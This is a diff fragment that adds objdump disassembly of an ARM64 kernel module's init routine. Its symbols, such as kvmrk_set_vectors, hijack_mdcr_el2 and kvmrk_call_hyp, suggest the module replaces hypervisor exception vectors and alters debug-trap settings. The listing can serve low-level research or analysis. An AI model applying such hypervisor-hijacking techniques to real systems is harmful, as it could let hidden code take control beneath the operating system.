+  f4:	91008000 	add	x0, x0, #0x20
+  f8:	94000000 	bl	0 <__ubsan_handle_out_of_bounds>
+  fc:	53067f00 	lsr	w0, w24, #6
+ 100:	d37bea73 	lsl	x19, x19, #5
+ 104:	90000001 	adrp	x1, 0 <cpu_bit_bitmap>
+ 108:	91000021 	add	x1, x1, #0x0
+ 10c:	cb204e73 	sub	x19, x19, w0, uxtw #3
+ 110:	52800000 	mov	w0, #0x0                   	// #0
+ 114:	8b130021 	add	x1, x1, x19
+ 118:	94000000 	bl	1a0 <init_module+0x1a0>
+ 11c:	90000000 	adrp	x0, 0 <kimage_voffset>
+ 120:	90000001 	adrp	x1, 0 <memstart_addr>
+ 124:	b240bbe2 	mov	x2, #0x7fffffffffff        	// #140737488355327
+ 128:	eb02029f 	cmp	x20, x2
+ 12c:	54000088 	b.hi	13c <init_module+0x13c>  // b.pmore
+ 130:	f9400020 	ldr	x0, [x1]
+ 134:	8b000280 	add	x0, x20, x0
+ 138:	14000003 	b	144 <init_module+0x144>
+ 13c:	f9400000 	ldr	x0, [x0]
+ 140:	cb0002c0 	sub	x0, x22, x0
+ 144:	94000000 	bl	1034 <kvmrk_set_vectors>
+ 148:	90000013 	adrp	x19, 0 <cpu_number>
+ 14c:	94000000 	bl	0 <init_module>
+ 150:	aa0003e1 	mov	x1, x0
+ 154:	91000273 	add	x19, x19, #0x0
+ 158:	11000718 	add	w24, w24, #0x1
+ 15c:	b8736821 	ldr	w1, [x1, x19]
+ 160:	90000000 	adrp	x0, 0 <init_module>
+ 164:	91000000 	add	x0, x0, #0x0
+ 168:	94000000 	bl	0 <_printk>
+ 16c:	17ffffd9 	b	d0 <init_module+0xd0>
+ 170:	90000000 	adrp	x0, 0 <init_module>
+ 174:	91000000 	add	x0, x0, #0x0
+ 178:	94000000 	bl	0 <_printk>
+ 17c:	90000000 	adrp	x0, 1004 <hijack_mdcr_el2>
+ 180:	91000000 	add	x0, x0, #0x0
+ 184:	d2e00021 	mov	x1, #0x1000000000000       	// #281474976710656
+ 188:	8b010001 	add	x1, x0, x1
+ 18c:	b240bbe2 	mov	x2, #0x7fffffffffff        	// #140737488355327
+ 190:	eb02003f 	cmp	x1, x2
+ 194:	540000a8 	b.hi	1a8 <init_module+0x1a8>  // b.pmore
+ 198:	90000000 	adrp	x0, 0 <memstart_addr>
+ 19c:	f9400000 	ldr	x0, [x0]
+ 1a0:	8b000020 	add	x0, x1, x0
+ 1a4:	14000004 	b	1b4 <init_module+0x1b4>
+ 1a8:	90000001 	adrp	x1, 0 <kimage_voffset>
+ 1ac:	f9400021 	ldr	x1, [x1]
+ 1b0:	cb010000 	sub	x0, x0, x1
+ 1b4:	94000000 	bl	1050 <kvmrk_call_hyp>
+ 1b8:	90000000 	adrp	x0, 0 <init_module>
+ 1bc:	91000000 	add	x0, x0, #0x0
+ 1c0:	94000000 	bl	0 <_printk>
+ 1c4:	52800000 	mov	w0, #0x0                   	// #0
+ 1c8:	a94153f3 	ldp	x19, x20, [sp, #16]
+ 1cc:	a9425bf5 	ldp	x21, x22, [sp, #32]
+ 1d0:	a94363f7 	ldp	x23, x24, [sp, #48]
+ 1d4:	a8c47bfd 	ldp	x29, x30, [sp], #64
+ 1d8:	d50323bf 	autiasp
+ 1dc:	d65f03c0 	ret
 
 Disassembly of section .exit.text:
 
